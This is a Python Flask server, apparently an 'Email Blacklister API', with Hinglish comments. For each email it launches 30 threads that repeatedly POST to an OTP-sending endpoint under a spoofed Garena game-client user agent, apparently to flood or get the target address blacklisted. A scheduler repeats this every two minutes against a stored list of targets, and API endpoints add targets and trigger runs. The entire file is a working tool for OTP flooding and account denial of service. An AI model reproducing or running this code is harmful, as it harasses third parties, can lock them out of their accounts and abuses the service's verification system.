import os
import time
import threading
import requests
import urllib3
import json
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
API_PORT = 5000
NUM_WORKERS = 30
AUTO_INTERVAL_MINUTES = 2  # Har 2 minute mein chalega
AUTO_EMAILS_FILE = "auto_emails.json"
RESULTS_FILE = "blacklist_results.json"

app = Flask(__name__)

# ==================== GLOBAL STATE ====================
auto_emails_list = []
results_history = []
any_success = False
any_success_lock = threading.Lock()
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0


# ==================== FILE HELPERS ====================
def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_EMAILS_FILE):
            with open(AUTO_EMAILS_FILE, 'r') as f:
                auto_emails_list = json.load(f)
        else:
            auto_emails_list = []
            save_auto_emails()
        print(f"[+] Loaded {len(auto_emails_list)} emails")
    except Exception as e:
        print(f"[!] Load error: {e}")
        auto_emails_list = []


def save_auto_emails():
    try:
        with open(AUTO_EMAILS_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        print(f"[!] Save error: {e}")


def save_results():
    try:
        with open(RESULTS_FILE, 'w') as f:
            json.dump(results_history[-500:], f, indent=4)  # last 500
    except Exception as e:
        print(f"[!] Save results error: {e}")


# ==================== WORKER ====================
def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {
            "app_id": "100067",
            "email": email,
            "locale": "en_HK"
        }
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15, verify=False)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return


def blacklist_email(email):
    """Blocking blacklist function - safe to call from threads"""
    global any_success, error_event, stop_event, generation

    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()

    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)

    stop_event.wait(timeout=20)

    for t in threads:
        t.join(timeout=2)

    if error_event.is_set():
        if not any_success:
            return False, "EMAIL ALREADY BLACKLISTED"
        else:
            return True, "EMAIL BLACKLISTED SUCCESSFULLY"
    return False, "UNKNOWN ERROR OCCURRED"


# ==================== AUTO BLACKLIST JOB (Har 2 minute) ====================
def run_auto_blacklist():
    """Ye function har 2 minute mein auto emails ko blacklist karega"""
    if not auto_emails_list:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Auto list empty, skipping...")
        return

    print(f"\n{'='*60}")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] AUTO BLACKLIST STARTED")
    print(f"[+] Total emails: {len(auto_emails_list)}")
    print(f"{'='*60}")

    summary = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}

    emails_copy = list(auto_emails_list)
    for email in emails_copy:
        print(f"[>] Processing: {email}")
        success, msg = blacklist_email(email)

        record = {
            "email": email,
            "success": success,
            "message": msg,
            "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        results_history.append(record)
        save_results()

        if success:
            summary["success"] += 1
            print(f"[✓] SUCCESS: {email}")
        elif "ALREADY" in msg:
            summary["skipped"] += 1
            print(f"[!] SKIPPED: {email}")
        else:
            summary["failed"] += 1
            print(f"[✗] FAILED: {email}")

        time.sleep(2)

    print(f"\n[+] AUTO BLACKLIST COMPLETE: {summary}")
    print(f"{'='*60}\n")


def auto_scheduler():
    """Background thread - har 2 minute mein auto blacklist chalata hai"""
    print(f"[+] Auto scheduler started (every {AUTO_INTERVAL_MINUTES} minute)")
    # Start mein pehle 10 second wait
    time.sleep(10)

    while True:
        try:
            run_auto_blacklist()
        except Exception as e:
            print(f"[!] Auto job error: {e}")

        # Har 2 minute (120 seconds) wait
        print(f"[+] Next auto-run in {AUTO_INTERVAL_MINUTES} minute(s)...")
        time.sleep(AUTO_INTERVAL_MINUTES * 60)


# ==================== API ENDPOINTS ====================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "service": "Email Blacklister API",
        "interval": f"{AUTO_INTERVAL_MINUTES} minutes",
        "total_emails": len(auto_emails_list),
        "total_results": len(results_history),
        "endpoints": {
            "POST /blacklist": "Blacklist single email now",
            "POST /add": "Add email to auto list",
            "POST /remove": "Remove email from auto list",
            "GET /list": "View auto list",
            "GET /results": "View recent results",
            "POST /run-now": "Trigger auto blacklist immediately",
            "DELETE /clear": "Clear auto list"
        }
    })


@app.route('/blacklist', methods=['POST'])
def api_blacklist():
    """Turant ek email blacklist karo"""
    data = request.get_json() or {}
    email = data.get('email', '').strip()

    if not email or '@' not in email or '.' not in email:
        return jsonify({"success": False, "error": "Invalid email"}), 400

    print(f"[API] Blacklisting now: {email}")
    success, msg = blacklist_email(email)

    record = {
        "email": email,
        "success": success,
        "message": msg,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "source": "api"
    }
    results_history.append(record)
    save_results()

    return jsonify({
        "success": success,
        "email": email,
        "message": msg,
        "time": record["time"]
    })


@app.route('/add', methods=['POST'])
def api_add():
    """Auto list mein email add karo (har 2 min blacklist hoga)"""
    data = request.get_json() or {}
    emails = data.get('emails', [])

    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]

    added, invalid, exists = [], [], []
    for email in emails:
        if not email or '@' not in email or '.' not in email:
            invalid.append(email)
        elif email in auto_emails_list:
            exists.append(email)
        else:
            auto_emails_list.append(email)
            added.append(email)

    save_auto_emails()

    return jsonify({
        "success": True,
        "added": added,
        "already_exists": exists,
        "invalid": invalid,
        "total_in_list": len(auto_emails_list)
    })


@app.route('/remove', methods=['POST'])
def api_remove():
    """Auto list se email remove karo"""
    data = request.get_json() or {}
    emails = data.get('emails', [])

    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]

    removed, not_found = [], []
    for email in emails:
        if email in auto_emails_list:
            auto_emails_list.remove(email)
            removed.append(email)
        else:
            not_found.append(email)

    save_auto_emails()

    return jsonify({
        "success": True,
        "removed": removed,
        "not_found": not_found,
        "total_in_list": len(auto_emails_list)
    })


@app.route('/list', methods=['GET'])
def api_list():
    """Auto list dekho"""
    return jsonify({
        "total": len(auto_emails_list),
        "emails": auto_emails_list,
        "interval_minutes": AUTO_INTERVAL_MINUTES
    })


@app.route('/results', methods=['GET'])
def api_results():
    """Recent blacklist results"""
    limit = request.args.get('limit', default=50, type=int)
    return jsonify({
        "total": len(results_history),
        "results": results_history[-limit:]
    })


@app.route('/run-now', methods=['POST'])
def api_run_now():
    """Abhi turant auto blacklist chala do (manually trigger)"""
    if not auto_emails_list:
        return jsonify({"success": False, "error": "Auto list is empty"}), 400

    # Background thread mein chala do taaki API block na ho
    t = threading.Thread(target=run_auto_blacklist, daemon=True)
    t.start()

    return jsonify({
        "success": True,
        "message": "Auto blacklist triggered in background",
        "total_emails": len(auto_emails_list)
    })


@app.route('/clear', methods=['DELETE'])
def api_clear():
    """Auto list clear karo"""
    global auto_emails_list
    count = len(auto_emails_list)
    auto_emails_list.clear()
    save_auto_emails()
    return jsonify({
        "success": True,
        "cleared": count,
        "message": "Auto list cleared"
    })


# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("  EMAIL BLACKLISTER API")
    print("="*60)
    print(f"[+] Port: {API_PORT}")
    print(f"[+] Workers per email: {NUM_WORKERS}")
    print(f"[+] Auto interval: {AUTO_INTERVAL_MINUTES} minute")
    print("="*60)

    load_auto_emails()

    # Auto scheduler thread start karo
    scheduler_thread = threading.Thread(target=auto_scheduler, daemon=True)
    scheduler_thread.start()

    print(f"[+] Server starting on http://0.0.0.0:{API_PORT}")
    print("="*60)

    app.run(host='0.0.0.0', port=API_PORT, debug=False, threaded=True)